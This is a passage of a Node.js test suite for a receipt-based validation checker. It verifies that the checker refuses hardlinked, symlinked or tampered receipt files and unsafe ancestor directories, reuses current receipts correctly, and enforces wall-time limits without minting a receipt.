    const outcome = await ensureGraphDerivedCheck(root, spec.digest, validationId);
    assert.equal(outcome.status, "refused");
    if (outcome.status === "refused") assert.equal(outcome.reasonCode, "CHECK_RECEIPT_PATH_UNSAFE");
  };
  // A SETTLED receipt must remain a final singleton; planted publication state is preserved.
  await writeFile(pendingPath, originalReceiptBytes, { mode: 0o600 });
  try {
    await ensureUnsafe();
    assert.deepEqual(await readFile(pendingPath), originalReceiptBytes);
    assert.deepEqual(await readFile(receiptPath), originalReceiptBytes);
  } finally { await rm(pendingPath); }
  await link(receiptPath, pendingPath);
  try {
    await ensureUnsafe();
    assert.equal((await lstat(receiptPath)).nlink, 2);
    assert.equal((await lstat(pendingPath)).ino, (await lstat(receiptPath)).ino);
  } finally { await rm(pendingPath); }
  const { receiptDigest: _receiptDigest, ...stalePendingDraft } = result.receipt;
  const stalePending = canonicalJson({
    ...stalePendingDraft,
    scopedDependencyDigest: canonicalDigest({ stalePendingCurrentness: true }),
    receiptDigest: canonicalDigest({ ...stalePendingDraft, scopedDependencyDigest: canonicalDigest({ stalePendingCurrentness: true }) }, { rejectAbsolutePaths: true }),
  }, { rejectAbsolutePaths: true });
  await writeFile(pendingPath, stalePending, { mode: 0o600 });
  try {
    await ensureUnsafe();
    assert.equal(await readFile(pendingPath, "utf8"), stalePending);
    assert.equal(await readFile(receiptPath, "utf8"), originalReceiptBytes.toString("utf8"));
  } finally { await rm(pendingPath); }
  await rm(receiptPath);
  await symlink(join(root, "package.json"), receiptPath);
  try {
    await ensureUnsafe();
    assert.equal((await lstat(receiptPath)).isSymbolicLink(), true);
  } finally {
    await rm(receiptPath);
    await writeFile(receiptPath, originalReceiptBytes, { mode: 0o600 });
  }
  assert.deepEqual(await ensureGraphDerivedCheck(root, spec.digest, validationId), result);

  await link(receiptPath, pendingPath);
  assert.equal((await lstat(receiptPath)).nlink, 2);
  const linkedRecovery = await runGraphDerivedCheck(root, spec.digest, validationId);
  assert.equal(linkedRecovery.status, "refused");
  if (linkedRecovery.status === "refused") assert.equal(linkedRecovery.reasonCode, "CHECK_RECEIPT_PATH_UNSAFE");
  assert.equal((await lstat(receiptPath)).nlink, 2);
  assert.equal((await lstat(pendingPath)).ino, (await lstat(receiptPath)).ino);
  await rm(pendingPath);

  await link(receiptPath, pendingPath);
  await rm(receiptPath);
  assert.equal((await lstat(pendingPath)).nlink, 1);
  const pendingRecovery = await runGraphDerivedCheck(root, spec.digest, validationId);
  assert.equal(pendingRecovery.status, "refused");
  if (pendingRecovery.status === "refused") assert.equal(pendingRecovery.reasonCode, "CHECK_RECEIPT_PATH_UNSAFE");
  assert.equal((await lstat(pendingPath)).nlink, 1);
  await assert.rejects(() => lstat(receiptPath), { code: "ENOENT" });
  await rename(pendingPath, receiptPath);

  const hostileLink = join(root, "hostile-receipt-hardlink");
  await link(receiptPath, hostileLink);
  const hostileHardlink = await runGraphDerivedCheck(root, spec.digest, validationId);
  assert.equal(hostileHardlink.status, "refused");
  assert.equal(hostileHardlink.reasonCode, "CHECK_RECEIPT_PATH_UNSAFE");
  await rm(hostileLink);

  const symlinkSpec = await candidate(root, "receipt-ancestor-symlink");
  await materialiseCandidate(root, symlinkSpec);
  const symlinkTarget = join(root, "receipt-ancestor-target");
  await mkdir(symlinkTarget, { mode: 0o700 });
  const symlinkCandidateDirectory = join(root, ".usf/receipts/check", symlinkSpec.digest.slice("sha256:".length));
  await symlink(symlinkTarget, symlinkCandidateDirectory);
  const hostileAncestor = await runGraphDerivedCheck(root, symlinkSpec.digest, validationId);
  assert.equal(hostileAncestor.status, "refused");
  assert.equal(hostileAncestor.reasonCode, "CHECK_RECEIPT_PATH_UNSAFE");

  const tampered = "{\"tampered\":true}";
  await writeFile(receiptPath, tampered, "utf8");
  const refused = await runGraphDerivedCheck(root, spec.digest, validationId);
  assert.equal(refused.status, "refused");
  assert.equal(refused.reasonCode, "CHECK_RECEIPT_INVALID");
  assert.equal(await readFile(receiptPath, "utf8"), tampered, "a conflicting local observation is never overwritten");

  await rm(receiptPath);
  await symlink(join(root, "package.json"), receiptPath);
  const substituted = await runGraphDerivedCheck(root, spec.digest, validationId);
  assert.equal(substituted.status, "refused");
  assert.equal(substituted.reasonCode, "CHECK_RECEIPT_PATH_UNSAFE");
});

test("legacy current receipt leaves no intent while canonical ensure reuses without a child", async (context) => {
  if (lockProcessUnavailable(context)) return;
  const root = await fixture(context);
  const spec = await candidate(root, "legacy-current-receipt");
  await materialiseCandidate(root, spec);
  const validationId = "urn:usf:validation:realisation-basis-chain-focused";
  const first = await checkSubprocess(root, spec.digest, validationId, "legacy");
  assert.equal(first.result?.status, "pass", first.result?.reasonCode);
  assert.equal(first.launches, 1);
  assert.equal(first.successfulExits, 1);
  const intentPath = first.receiptPath.replace(/\.json$/u, ".intent.json");
  const receiptBytes = await readFile(first.receiptPath);
  await assert.rejects(() => lstat(intentPath), { code: "ENOENT" });
  const ensured = await checkSubprocess(root, spec.digest, validationId, "ensure");
  assert.equal(ensured.result?.status, "pass", ensured.result?.reasonCode);
  assert.equal(ensured.launches, 0, "canonical ensure reuses the existing current receipt");
  assert.equal(ensured.successfulExits, 0, "canonical ensure launches no replacement child");
  assert.deepEqual(await readFile(first.receiptPath), receiptBytes);
  await assert.rejects(() => lstat(intentPath), { code: "ENOENT" });
  const legacyReplay = await checkSubprocess(root, spec.digest, validationId, "legacy");
  assert.equal(legacyReplay.result?.status, "pass", legacyReplay.result?.reasonCode);
  assert.equal(legacyReplay.launches, 1, "legacy keeps its explicit no-intent rerun behavior");
  assert.equal(legacyReplay.successfulExits, 1, "legacy rerun has one genuine child exit");
  await assert.rejects(() => lstat(intentPath), { code: "ENOENT" });
});

test("graph-derived check enforces graph wall time and mints no timeout receipt", async (context) => {
  if (lockProcessUnavailable(context)) return;
  const root = await fixture(context);
  const graphPath = join(root, "graph/integration.nq");
  const graph = await readFile(graphPath, "utf8");
  const boundedGraph = graph
    .replace(
      '<urn:usf:algorithm:work-integration-transition:2> <urn:usf:predicate:candidateValidationWallTimeMilliseconds> "120000"',
      '<urn:usf:algorithm:work-integration-transition:2> <urn:usf:predicate:candidateValidationWallTimeMilliseconds> "1"',
    )
    .replace(
      '<urn:usf:algorithm:work-integration-transition:2> <urn:usf:predicate:validationTerminationGraceMilliseconds> "5000"',
      '<urn:usf:algorithm:work-integration-transition:2> <urn:usf:predicate:validationTerminationGraceMilliseconds> "1"',
    )
    .replace(
      '<urn:usf:algorithm:work-integration-transition:2> <urn:usf:predicate:validationMaximumSettlementWallTimeMilliseconds> "125000"',
      '<urn:usf:algorithm:work-integration-transition:2> <urn:usf:predicate:validationMaximumSettlementWallTimeMilliseconds> "2"',
    );
  assert.notEqual(boundedGraph, graph);
  await writeFile(graphPath, boundedGraph, "utf8");
  const spec = await candidate(root, "graph-timeout");
  await materialiseCandidate(root, spec);
  const validationId = "urn:usf:validation:realisation-basis-chain-focused";
  const result = await runGraphDerivedCheck(root, spec.digest, validationId);
  assert.equal(result.status, "refused");
  assert.equal(result.reasonCode, "CHECK_TIMEOUT");
  assert.equal(result.validationWallTimeMilliseconds, 1);
  assert.equal(result.validationTerminationGraceMilliseconds, 1);
  assert.equal(result.validationTimedOut, true);
  assert.equal(["SIGTERM", "SIGKILL"].includes(result.validationTimeoutTerminationSignal ?? ""), true);
  assert.match(result.outputResultDigest ?? "", /^sha256:[0-9a-f]{64}$/u);
  assert.equal(await readGraphDerivedCheckReceipt(root, spec.digest, validationId), null);
});

test("graph-derived check identifies an unsafe fixture ancestor without losing the generic refusal", async (context) => {
  if (lockProcessUnavailable(context)) return;
  const root = await fixture(context);
  const selectedManifest = "graph/manifests/check-confinement-fixture.json";
  await writeFile(join(root, selectedManifest), JSON.stringify({
    schema: "urn:usf:graph-manifest:2", version: 2,
    imports: [manifestPath, "graph/manifests/fixture-process-runtime.json"],
    sources: [],
  }), "utf8");
  const semanticPath = join(root, "graph/semantic-first.nq");
  const semantic = await readFile(semanticPath, "utf8");
  const originalMode = '<urn:usf:validation:realisation-basis-chain-focused> <urn:usf:predicate:executionMode> <urn:usf:mode:deterministic-test-substitute>';
  assert.equal(semantic.split(originalMode).length, 2);
  await writeFile(semanticPath, semantic.replace(originalMode,
    '<urn:usf:validation:realisation-basis-chain-focused> <urn:usf:predicate:executionMode> <urn:usf:mode:confined-fixture-process:2>'), "utf8");
  const closurePath = join(root, "graph/usf-bootstrap.nq");
  const closure = await readFile(closurePath, "utf8");
  const assetRows = ["src/realisation/fixture-process.apparmor", "src/realisation/fixture-process-launcher.py"].map(path =>
    '<urn:usf:validation-runtime-closure:realisation-basis-chain-focused:1> <urn:usf:predicate:repositoryReadFile> "' + path + '" <urn:usf:graph:usf-bootstrap> .');
  await writeFile(closurePath, closure.trimEnd() + "\n" + assetRows.join("\n") + "\n", "utf8");
  const spec = await candidate(root, "unsafe-fixture-ancestor", selectedManifest);
  await materialiseCandidate(root, spec);
  const workspace = join(root, ".usf/workspaces", spec.digest.slice("sha256:".length));
  const manifestBefore = await readFile(join(workspace, ".usf-workspace.json"));
  const parent = resolve(root, "..");
  const parentMode = (await lstat(parent)).mode & 0o777;
  const validationId = "urn:usf:validation:realisation-basis-chain-focused";
  try {
    await chmod(parent, 0o770);
    const result = await runGraphDerivedCheck(root, spec.digest, validationId);
    assert.equal(result.status, "refused");
    if (result.status !== "refused") return;
    assert.equal(result.reasonCode, "CHECK_CONFINEMENT_UNAVAILABLE", JSON.stringify(result));
    assert.equal(result.confinementFailure, "FIXTURE_POLICY_AUTHENTICATION_FAILED");
    assert.deepEqual(await readFile(join(workspace, ".usf-workspace.json")), manifestBefore);
    assert.equal(await readGraphDerivedCheckReceipt(root, spec.digest, validationId), null);
    await assert.rejects(() => lstat(join(root, ".usf/receipts/check", spec.digest.slice("sha256:".length))), { code: "ENOENT" });
  } finally {
    await chmod(parent, parentMode);
  }
});
